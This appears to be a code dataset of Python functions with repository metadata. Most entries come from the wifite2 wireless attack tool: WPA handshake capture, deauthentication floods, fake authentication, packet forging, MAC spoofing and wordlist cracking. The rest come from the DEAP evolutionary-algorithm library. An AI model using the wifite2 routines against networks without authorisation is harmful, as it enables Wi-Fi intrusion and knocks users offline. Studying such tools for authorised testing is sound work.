{"docstring": "'''Returns captured or stored handshake, otherwise None.'''\n", "func_signal": "def capture_handshake(self):\n", "code": "handshake = None\n\n# First, start Airodump process\nwith Airodump(channel=self.target.channel,\n              target_bssid=self.target.bssid,\n              skip_wps=True,\n              output_file_prefix='wpa') as airodump:\n\n    Color.clear_entire_line()\n    Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')\n    airodump_target = self.wait_for_target(airodump)\n\n    self.clients = []\n\n    # Try to load existing handshake\n    if Configuration.ignore_old_handshakes == False:\n        bssid = airodump_target.bssid\n        essid = airodump_target.essid if airodump_target.essid_known else None\n        handshake = self.load_handshake(bssid=bssid, essid=essid)\n        if handshake:\n            Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)\n            Color.pl('\\n{+} Using handshake from {C}%s{W}' % handshake.capfile)\n            return handshake\n\n    timeout_timer = Timer(Configuration.wpa_attack_timeout)\n    deauth_timer = Timer(Configuration.wpa_deauth_timeout)\n\n    while handshake is None and not timeout_timer.ended():\n        step_timer = Timer(1)\n        Color.clear_entire_line()\n        Color.pattack('WPA',\n                airodump_target,\n                'Handshake capture',\n                'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))\n\n        # Find .cap file\n        cap_files = airodump.find_files(endswith='.cap')\n        if len(cap_files) == 0:\n            # No cap files yet\n            time.sleep(step_timer.remaining())\n            continue\n        cap_file = cap_files[0]\n\n        # Copy .cap file to temp for consistency\n        temp_file = Configuration.temp('handshake.cap.bak')\n        copy(cap_file, temp_file)\n\n        # Check cap file in temp for Handshake\n        bssid = airodump_target.bssid\n        essid = airodump_target.essid if airodump_target.essid_known else None\n        handshake = Handshake(temp_file, bssid=bssid, essid=essid)\n        if handshake.has_handshake():\n            # We got a handshake\n            Color.clear_entire_line()\n            Color.pattack('WPA',\n                    airodump_target,\n                    'Handshake capture',\n                    '{G}Captured handshake{W}')\n            Color.pl('')\n            break\n\n        # There is no handshake\n        handshake = None\n        # Delete copied .cap file in temp to save space\n        os.remove(temp_file)\n\n        # Look for new clients\n        airodump_target = self.wait_for_target(airodump)\n        for client in airodump_target.clients:\n            if client.station not in self.clients:\n                Color.clear_entire_line()\n                Color.pattack('WPA',\n                        airodump_target,\n                        'Handshake capture',\n                        'Discovered new client: {G}%s{W}' % client.station)\n                Color.pl('')\n                self.clients.append(client.station)\n\n        # Send deauth to a client or broadcast\n        if deauth_timer.ended():\n            self.deauth(airodump_target)\n            # Restart timer\n            deauth_timer = Timer(Configuration.wpa_deauth_timeout)\n\n        # Sleep for at-most 1 second\n        time.sleep(step_timer.remaining())\n        continue # Handshake listen+deauth loop\n\nif handshake is None:\n    # No handshake, attack failed.\n    Color.pl('\\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (Configuration.wpa_attack_timeout))\n    return handshake\nelse:\n    # Save copy of handshake to ./hs/\n    self.save_handshake(handshake)\n    return handshake", "path": "wifite2/wifite/attack/wpa.py", "commit_date": "2018-08-25 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''Put interface down, run macchanger with options, put interface up'''\n", "func_signal": "def down_macch_up(cls, iface, options):\n", "code": "from ..util.process import Process\n\nColor.clear_entire_line()\nColor.p('\\r{+} {C}macchanger{W}: taking interface {C}%s{W} down...' % iface)\n\nIfconfig.down(iface)\n\nColor.clear_entire_line()\nColor.p('\\r{+} {C}macchanger{W}: changing mac address of interface {C}%s{W}...' % iface)\n\ncommand = ['macchanger']\ncommand.extend(options)\ncommand.append(iface)\nmacch = Process(command)\nmacch.wait()\nif macch.poll() != 0:\n    Color.pl('\\n{!} {R}macchanger{O}: error running {R}%s{O}' % ' '.join(command))\n    Color.pl('{!} {R}output: {O}%s, %s{W}' % (macch.stdout(), macch.stderr()))\n    return False\n\nColor.clear_entire_line()\nColor.p('\\r{+} {C}macchanger{W}: bringing interface {C}%s{W} up...' % iface)\n\nIfconfig.up(iface)\n\nreturn True", "path": "wifite2/wifite/tools/macchanger.py", "commit_date": "2018-06-10 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\nDeletes airodump* files in the temp directory.\nAlso deletes replay_*.cap and *.xor files in pwd.\n'''\n# Remove all temp files\n", "func_signal": "def delete_airodump_temp_files(cls, output_file_prefix):\n", "code": "for fil in cls.find_files_by_output_prefix(output_file_prefix):\n    os.remove(fil)\n\n# Remove .cap and .xor files from pwd\nfor fil in os.listdir('.'):\n    if fil.startswith('replay_') and fil.endswith('.cap') or fil.endswith('.xor'):\n        os.remove(fil)\n\n# Remove replay/cap/xor files from temp\ntemp_dir = Configuration.temp()\nfor fil in os.listdir(temp_dir):\n    if fil.startswith('replay_') and fil.endswith('.cap') or fil.endswith('.xor'):\n        os.remove(os.path.join(temp_dir, fil))", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\nSetting things up for this context.\nCalled at start of 'with Airodump(...) as x:'\nActually starts the airodump process.\n'''\n", "func_signal": "def __enter__(self):\n", "code": "if self.delete_existing_files:\n    self.delete_airodump_temp_files(self.output_file_prefix)\n\nself.csv_file_prefix = Configuration.temp() + self.output_file_prefix\n\n# Build the command\ncommand = [\n    'airodump-ng',\n    self.interface,\n    '-a', # Only show associated clients\n    '-w', self.csv_file_prefix, # Output file prefix\n    '--write-interval', '1' # Write every second\n]\nif self.channel:    command.extend(['-c', str(self.channel)])\nelif self.five_ghz: command.extend(['--band', 'a'])\n\nif self.encryption:   command.extend(['--enc', self.encryption])\nif self.wps:          command.extend(['--wps'])\nif self.target_bssid: command.extend(['--bssid', self.target_bssid])\n\nif self.ivs_only: command.extend(['--output-format', 'ivs,csv'])\nelse:             command.extend(['--output-format', 'pcap,csv'])\n\n# Start the process\nself.pid = Process(command, devnull=True)\nreturn self", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''Returns list of Target objects parsed from CSV file.'''\n", "func_signal": "def get_targets_from_csv(csv_filename):\n", "code": "targets = []\nimport csv\nwith open(csv_filename, 'r') as csvopen:\n    lines = []\n    for line in csvopen:\n        line = line.replace('\\0', '')\n        lines.append(line)\n    csv_reader = csv.reader(lines,\n            delimiter=',',\n            quoting=csv.QUOTE_ALL,\n            skipinitialspace=True,\n            escapechar='\\\\')\n\n    hit_clients = False\n    for row in csv_reader:\n        # Each 'row' is a list of fields for a target/client\n\n        if len(row) == 0: continue\n\n        if row[0].strip() == 'BSSID':\n            # This is the 'header' for the list of Targets\n            hit_clients = False\n            continue\n\n        elif row[0].strip() == 'Station MAC':\n            # This is the 'header' for the list of Clients\n            hit_clients = True\n            continue\n\n        if hit_clients:\n            # The current row corresponds to a 'Client' (computer)\n            try:\n                client = Client(row)\n            except (IndexError, ValueError) as e:\n                # Skip if we can't parse the client row\n                continue\n\n            if 'not associated' in client.bssid:\n                # Ignore unassociated clients\n                continue\n\n            # Add this client to the appropriate Target\n            for t in targets:\n                if t.bssid == client.bssid:\n                    t.clients.append(client)\n                    break\n\n        else:\n            # The current row corresponds to a 'Target' (router)\n            try:\n                target = Target(row)\n                targets.append(target)\n            except Exception:\n                continue\n\nreturn targets", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\nSends deauths (to broadcast and to each client) for all\ntargets (APs) that have unknown ESSIDs (hidden router names).\n'''\n", "func_signal": "def deauth_hidden_targets(self):\n", "code": "self.decloaking = False\n\nif Configuration.no_deauth:\n    return  # Do not deauth if requested\n\nif self.channel is None:\n    return  # Do not deauth if channel is not fixed.\n\n# Reusable deauth command\ndeauth_cmd = [\n    'aireplay-ng',\n    '-0', # Deauthentication\n    str(Configuration.num_deauths), # Number of deauth packets to send\n    '--ignore-negative-one'\n]\n\nfor target in self.targets:\n    if target.essid_known:\n        continue\n\n    now = int(time.time())\n    secs_since_decloak = now - self.decloaked_times.get(target.bssid, 0)\n\n    if secs_since_decloak < 30:\n        continue  # Decloak every AP once every 30 seconds\n\n    self.decloaking = True\n    self.decloaked_times[target.bssid] = now\n    if Configuration.verbose > 1:\n        from ..util.color import Color\n        Color.pe('{C} [?] Deauthing %s (broadcast & %d clients){W}' % (target.bssid, len(target.clients)))\n\n    # Deauth broadcast\n    iface = Configuration.interface\n    Process(deauth_cmd + ['-a', target.bssid, iface])\n\n    # Deauth clients\n    for client in target.clients:\n        Process(deauth_cmd + ['-a', target.bssid, '-c', client.bssid, iface])", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\n    Starts aireplay process.\n    Args:\n        target - Instance of Target object, AP to attack.\n        attack_type - str, e.g. 'fakeauth', 'arpreplay', etc.\n        client_mac - MAC address of an associated client.\n'''\n", "func_signal": "def __init__(self, target, attack_type, client_mac=None, replay_file=None):\n", "code": "super(Aireplay, self).__init__() # Init the parent Thread\n\nself.target = target\nself.output_file = Configuration.temp('aireplay_%s.output' % attack_type)\nself.attack_type = WEPAttackType(attack_type).value\nself.error = None\nself.status = None\nself.cmd = Aireplay.get_aireplay_command(self.target,\n                                    attack_type,\n                                    client_mac=client_mac,\n                                    replay_file=replay_file)\nself.pid = Process(self.cmd,\n        stdout=open(self.output_file, 'a'),\n        stderr=Process.devnull(),\n        cwd=Configuration.temp())\nself.start()", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\nTearing things down since the context is being exited.\nCalled after 'with Airodump(...)' goes out of scope.\n'''\n# Kill the process\n", "func_signal": "def __exit__(self, type, value, traceback):\n", "code": "self.pid.interrupt()\n\nif self.delete_existing_files:\n    self.delete_airodump_temp_files(self.output_file_prefix)", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''Initiates full WPA handshake capture attack.'''\n\n# Skip if target is not WPS\n", "func_signal": "def run(self):\n", "code": "if Configuration.wps_only and self.target.wps == False:\n    Color.pl('\\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)\n    self.success = False\n    return self.success\n\n# Skip if user only wants to run PMKID attack\nif Configuration.use_pmkid_only:\n    self.success = False\n    return False\n\n# Capture the handshake (or use an old one)\nhandshake = self.capture_handshake()\n\nif handshake is None:\n    # Failed to capture handshake\n    self.success = False\n    return self.success\n\n# Analyze handshake\nColor.pl('\\n{+} analysis of captured handshake file:')\nhandshake.analyze()\n\n# Check wordlist\nif Configuration.wordlist is None:\n    Color.pl('{!} {O}Not cracking handshake because' +\n             ' wordlist ({R}--dict{O}) is not set')\n    self.success = False\n    return False\n\nelif not os.path.exists(Configuration.wordlist):\n    Color.pl('{!} {O}Not cracking handshake because' +\n             ' wordlist {R}%s{O} was not found' % Configuration.wordlist)\n    self.success = False\n    return False\n\nColor.pl('\\n{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with' +\n        ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[-1])\n\n# Crack it\nkey = Aircrack.crack_handshake(handshake, show_command=False)\nif key is None:\n    Color.pl('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % Configuration.wordlist.split(os.sep)[-1])\n    self.success = False\nelse:\n    Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\\n' % key)\n    self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)\n    self.crack_result.dump()\n    self.success = True\nreturn self.success", "path": "wifite2/wifite/attack/wpa.py", "commit_date": "2018-08-25 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\n    Sends deauthentication request to broadcast and every client of target.\n    Args:\n        target - The Target to deauth, including clients.\n'''\n", "func_signal": "def deauth(self, target):\n", "code": "if Configuration.no_deauth: return\n\nfor index, client in enumerate([None] + self.clients):\n    if client is None:\n        target_name = '*broadcast*'\n    else:\n        target_name = client\n    Color.clear_entire_line()\n    Color.pattack('WPA',\n            target,\n            'Handshake capture',\n            'Deauthing {O}%s{W}' % target_name)\n    Aireplay.deauth(target.bssid, client_mac=client, timeout=2)", "path": "wifite2/wifite/attack/wpa.py", "commit_date": "2018-08-25 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\n    Saves a copy of the handshake file to hs/\n    Args:\n        handshake - Instance of Handshake containing bssid, essid, capfile\n'''\n# Create handshake dir\n", "func_signal": "def save_handshake(self, handshake):\n", "code": "if not os.path.exists(Configuration.wpa_handshake_dir):\n    os.makedirs(Configuration.wpa_handshake_dir)\n\n# Generate filesystem-safe filename from bssid, essid and date\nif handshake.essid and type(handshake.essid) is str:\n    essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)\nelse:\n    essid_safe = 'UnknownEssid'\nbssid_safe = handshake.bssid.replace(':', '-')\ndate = time.strftime('%Y-%m-%dT%H-%M-%S')\ncap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)\ncap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)\n\nif Configuration.wpa_strip_handshake:\n    Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)\n    handshake.strip(outfile=cap_filename)\n    Color.pl('{G}saved{W}')\nelse:\n    Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)\n    copy(handshake.capfile, cap_filename)\n    Color.pl('{G}saved{W}')\n\n# Update handshake to use the stored handshake file for future operations\nhandshake.capfile = cap_filename", "path": "wifite2/wifite/attack/wpa.py", "commit_date": "2018-08-25 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "''' Stops aireplay process '''\n", "func_signal": "def stop(self):\n", "code": "if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:\n    self.pid.interrupt()", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "''' Finds the last .xor file in the directory '''\n", "func_signal": "def get_xor():\n", "code": "xor = None\nfor fil in os.listdir(Configuration.temp()):\n    if fil.startswith('replay_') and fil.endswith('.xor') or \\\n       fil.startswith('fragment-') and fil.endswith('.xor'):\n        xor = fil\nreturn xor", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "''' Filters targets based on Configuration '''\n", "func_signal": "def filter_targets(targets, skip_wps=False):\n", "code": "result = []\n# Filter based on Encryption\nfor target in targets:\n    if Configuration.clients_only and len(target.clients) == 0:\n        continue\n    if 'WEP' in Configuration.encryption_filter and 'WEP' in target.encryption:\n        result.append(target)\n    elif 'WPA' in Configuration.encryption_filter and 'WPA' in target.encryption:\n            result.append(target)\n    elif 'WPS' in Configuration.encryption_filter and target.wps in [WPSState.UNLOCKED, WPSState.LOCKED]:\n        result.append(target)\n    elif skip_wps:\n        result.append(target)\n\n# Filter based on BSSID/ESSID\nbssid = Configuration.target_bssid\nessid = Configuration.target_essid\ni = 0\nwhile i < len(result):\n    if result[i].essid is not None and Configuration.ignore_essid is not None and Configuration.ignore_essid.lower() in result[i].essid.lower():\n        result.pop(i)\n    elif bssid and result[i].bssid.lower() != bssid.lower():\n        result.pop(i)\n    elif essid and result[i].essid and result[i].essid.lower() != essid.lower():\n        result.pop(i)\n    else:\n        i += 1\nreturn result", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "# Helper method to get interface from configuration\n", "func_signal": "def get_interface(cls):\n", "code": "from ..config import Configuration\nreturn Configuration.interface", "path": "wifite2/wifite/tools/macchanger.py", "commit_date": "2018-06-10 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "''' Forges packet from .xor file '''\n", "func_signal": "def forge_packet(xor_file, bssid, station_mac):\n", "code": "forged_file = 'forged.cap'\ncmd = [\n    'packetforge-ng',\n    '-0',\n    '-a', bssid,           # Target MAC\n    '-h', station_mac,     # Client MAC\n    '-k', '192.168.1.2',   # Dest IP\n    '-l', '192.168.1.100', # Source IP\n    '-y', xor_file,        # Read PRNG from .xor file\n    '-w', forged_file,     # Write to\n    Configuration.interface\n]\n\ncmd = '\"%s\"' % '\" \"'.join(cmd)\n(out, err) = Process.call(cmd, cwd=Configuration.temp(), shell=True)\nif out.strip() == 'Wrote packet to: %s' % forged_file:\n    return forged_file\nelse:\n    from ..util.color import Color\n    Color.pl('{!} {R}failed to forge packet from .xor file{W}')\n    Color.pl('output:\\n\"%s\"' % out)\n    return None", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\n    Sets appropriate attack name/value given an input.\n    Args:\n        var - Can be a string, number, or WEPAttackType object\n              This object's name & value is set depending on var.\n'''\n", "func_signal": "def __init__(self, var):\n", "code": "self.value = None\nself.name = None\nif type(var) is int:\n    for (name,value) in WEPAttackType.__dict__.items():\n        if type(value) is int:\n            if value == var:\n                self.name = name\n                self.value = value\n                return\n    raise Exception('Attack number %d not found' % var)\nelif type(var) is str:\n    for (name,value) in WEPAttackType.__dict__.items():\n        if type(value) is int:\n            if name == var:\n                self.name = name\n                self.value = value\n                return\n    raise Exception('Attack name %s not found' % var)\nelif type(var) == WEPAttackType:\n    self.name = var.name\n    self.value = var.value\nelse:\n    raise Exception('Attack type not supported')", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "'''\nTries a one-time fake-authenticate with a target AP.\nParams:\n    target (py.Target): Instance of py.Target\n    timeout (int): Time to wait for fakeuth to succeed.\n    num_attempts (int): Number of fakeauth attempts to make.\nReturns:\n    (bool): True if fakeauth succeeds, otherwise False\n'''\n\n", "func_signal": "def fakeauth(target, timeout=5, num_attempts=3):\n", "code": "cmd = [\n    'aireplay-ng',\n    '-1', '0', # Fake auth, no delay\n    '-a', target.bssid,\n    '-T', str(num_attempts)\n]\nif target.essid_known:\n    cmd.extend(['-e', target.essid])\ncmd.append(Configuration.interface)\nfakeauth_proc = Process(cmd,\n        devnull=False,\n        cwd=Configuration.temp())\n\ntimer = Timer(timeout)\nwhile fakeauth_proc.poll() is None and not timer.ended():\n    time.sleep(0.1)\nif fakeauth_proc.poll() is None or timer.ended():\n    fakeauth_proc.interrupt()\n    return False\noutput = fakeauth_proc.stdout()\nreturn 'association successful' in output.lower()", "path": "wifite2/wifite/tools/aireplay.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "# product('ABCD', 'xy') --> Ax Ay Bx By Cx Cy Dx Dy\n# product(range(2), repeat=3) --> 000 001 010 011 100 101 110 111\n", "func_signal": "def product(*args, **kwds):\n", "code": "pools = map(tuple, args) * kwds.get('repeat', 1)\nresult = [[]]\nfor pool in pools:\n    result = [x+[y] for x in result for y in pool]\nfor prod in result:\n    yield tuple(prod)", "path": "deap/doc/code/tutorials/part_4/sortingnetwork.py", "commit_date": "2012-03-03 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Sort the values in-place based on the connectors in the network.\"\"\"\n", "func_signal": "def sort(self, values):\n", "code": "for level in self:\n    for wire1, wire2 in level.iteritems():\n        if values[wire1] > values[wire2]:\n            values[wire1], values[wire2] = values[wire2], values[wire1]", "path": "deap/doc/code/tutorials/part_4/sortingnetwork.py", "commit_date": "2012-03-03 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Binary deceptive function from : Multivariate Multi-Model Approach for\nGlobally Multimodal Problems by Chung-Yao Chuang and Wen-Lian Hsu.\n\nThe function takes individual of 40+1 dimensions and has two global optima\nin [1,1,...,1] and [0,0,...,0].\n\"\"\"\n", "func_signal": "def chuang_f3(individual):\n", "code": "total = 0\nif individual[-1] == 0:\n    for i in xrange(0, len(individual)-1, 4):\n        total += inv_trap(individual[i:i+4])\nelse:\n    for i in xrange(2, len(individual)-3, 4):\n        total += inv_trap(individual[i:i+4])\n    total += trap(individual[-2:]+individual[:2])\nreturn total,", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Royal Road Function R2 as presented by Melanie Mitchell in :\n\"An introduction to Genetic Algorithms\".\n\"\"\"\n", "func_signal": "def royal_road2(individual, order):\n", "code": "total = 0\nnorder = order\nwhile norder < order**2:\n    total += royal_road1(individual, norder)[0]\n    norder *= 2\nreturn total,", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Add a connector between wire1 and wire2 in the network.\"\"\"\n", "func_signal": "def addConnector(self, wire1, wire2):\n", "code": "if wire1 == wire2:\n    return\n\nif wire1 > wire2:\n    wire1, wire2 = wire2, wire1\n\ntry:\n    last_level = self[-1]\nexcept IndexError:\n    # Empty network, create new level and connector\n    self.append({wire1: wire2})\n    return\n\nfor wires in last_level.iteritems():\n    if wires[1] >= wire1 and wires[0] <= wire2:\n        self.append({wire1: wire2})\n        return\n\nlast_level[wire1] = wire2", "path": "deap/doc/code/tutorials/part_4/sortingnetwork.py", "commit_date": "2012-03-03 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "# Generate lambda_ individuals and put them into the provided class\n", "func_signal": "def generate(self, ind_init):\n", "code": "arz = self.centroid + self.sigma * numpy.random.randn(self.lambda_, self.dim)\nreturn list(map(ind_init, arz))", "path": "deap/examples/eda/emna.py", "commit_date": "2014-04-04 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Binary deceptive function from : Multivariate Multi-Model Approach for\nGlobally Multimodal Problems by Chung-Yao Chuang and Wen-Lian Hsu.\n\nThe function takes individual of 40+1 dimensions and has two global optima\nin [1,1,...,1] and [0,0,...,0].\n\"\"\"\n", "func_signal": "def chuang_f1(individual):\n", "code": "total = 0\nif individual[-1] == 0:\n    for i in xrange(0, len(individual)-1, 4):\n        total += inv_trap(individual[i:i+4])\nelse:\n    for i in xrange(0, len(individual)-1, 4):\n        total += trap(individual[i:i+4])\nreturn total,", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Decorate *alias* with the specified *decorators*, *alias*\nhas to be a registered function in the current toolbox.\n\n:param alias: The name of the operator to decorate.\n:param decorator: One or more function decorator. If multiple\n                  decorators are provided they will be applied in\n                  order, with the last decorator decorating all the\n                  others.\n\n.. note::\n    Decorate a function using the toolbox makes it unpicklable, and\n    will produce an error on pickling. Although this limitation is not\n    relevant in most cases, it may have an impact on distributed\n    environments like multiprocessing.\n    A function can still be decorated manually before it is added to\n    the toolbox (using the @ notation) in order to be picklable.\n\"\"\"\n", "func_signal": "def decorate(self, alias, *decorators):\n", "code": "pfunc = getattr(self, alias)\nfunction, args, kargs = pfunc.func, pfunc.args, pfunc.keywords\nfor decorator in decorators:\n    function = decorator(function)\nself.register(alias, function, *args, **kargs)", "path": "deap/deap/base.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Register a *function* in the toolbox under the name *alias*. You\nmay provide default arguments that will be passed automatically when\ncalling the registered function. Fixed arguments can then be overridden\nat function call time.\n\n:param alias: The name the operator will take in the toolbox. If the\n              alias already exist it will overwrite the operator\n              already present.\n:param function: The function to which refer the alias.\n:param argument: One or more argument (and keyword argument) to pass\n                 automatically to the registered function when called,\n                 optional.\n\nThe following code block is an example of how the toolbox is used. ::\n\n    >>> def func(a, b, c=3):\n    ...     print a, b, c\n    ...\n    >>> tools = Toolbox()\n    >>> tools.register(\"myFunc\", func, 2, c=4)\n    >>> tools.myFunc(3)\n    2 3 4\n\nThe registered function will be given the attributes :attr:`__name__`\nset to the alias and :attr:`__doc__` set to the original function's\ndocumentation. The :attr:`__dict__` attribute will also be updated\nwith the original function's instance dictionary, if any.\n\"\"\"\n", "func_signal": "def register(self, alias, function, *args, **kargs):\n", "code": "pfunc = partial(function, *args, **kargs)\npfunc.__name__ = alias\npfunc.__doc__ = function.__doc__\n\nif hasattr(function, \"__dict__\") and not isinstance(function, type):\n    # Some functions don't have a dictionary, in these cases\n    # simply don't copy it. Moreover, if the function is actually\n    # a class, we do not want to copy the dictionary.\n    pfunc.__dict__.update(function.__dict__.copy())\n\nsetattr(self, alias, pfunc)", "path": "deap/deap/base.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Binary deceptive function from : Multivariate Multi-Model Approach for\nGlobally Multimodal Problems by Chung-Yao Chuang and Wen-Lian Hsu.\n\nThe function takes individual of 40+1 dimensions and has four global optima\nin [1,1,...,0,0], [0,0,...,1,1], [1,1,...,1] and [0,0,...,0].\n\"\"\"\n", "func_signal": "def chuang_f2(individual):\n", "code": "total = 0\nif individual[-2] == 0 and individual[-1] == 0:\n    for i in xrange(0, len(individual)-2, 8):\n        total += inv_trap(individual[i:i+4]) + inv_trap(individual[i+4:i+8])\nelif individual[-2] == 0 and individual[-1] == 1:\n    for i in xrange(0, len(individual)-2, 8):\n        total += inv_trap(individual[i:i+4]) + trap(individual[i+4:i+8])\nelif individual[-2] == 1 and individual[-1] == 0:\n    for i in xrange(0, len(individual)-2, 8):\n        total += trap(individual[i:i+4]) + inv_trap(individual[i+4:i+8])\nelse:\n    for i in xrange(0, len(individual)-2, 8):\n        total += trap(individual[i:i+4]) + trap(individual[i+4:i+8])\nreturn total,", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Return an ASCII representation of the network.\"\"\"\n", "func_signal": "def draw(self):\n", "code": "str_wires = [[\"-\"]*7 * self.depth]\nstr_wires[0][0] = \"0\"\nstr_wires[0][1] = \" o\"\nstr_spaces = []\n\nfor i in xrange(1, self.dimension):\n    str_wires.append([\"-\"]*7 * self.depth)\n    str_spaces.append([\" \"]*7 * self.depth)\n    str_wires[i][0] = str(i)\n    str_wires[i][1] = \" o\"\n\nfor index, level in enumerate(self):\n    for wire1, wire2 in level.iteritems():\n        str_wires[wire1][(index+1)*6] = \"x\"\n        str_wires[wire2][(index+1)*6] = \"x\"\n        for i in xrange(wire1, wire2):\n            str_spaces[i][(index+1)*6+1] = \"|\"\n        for i in xrange(wire1+1, wire2):\n            str_wires[i][(index+1)*6] = \"|\"\n\nnetwork_draw = \"\".join(str_wires[0])\nfor line, space in zip(str_wires[1:], str_spaces):\n    network_draw += \"\\n\"\n    network_draw += \"\".join(space)\n    network_draw += \"\\n\"\n    network_draw += \"\".join(line)\nreturn network_draw", "path": "deap/doc/code/tutorials/part_4/sortingnetwork.py", "commit_date": "2012-03-03 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
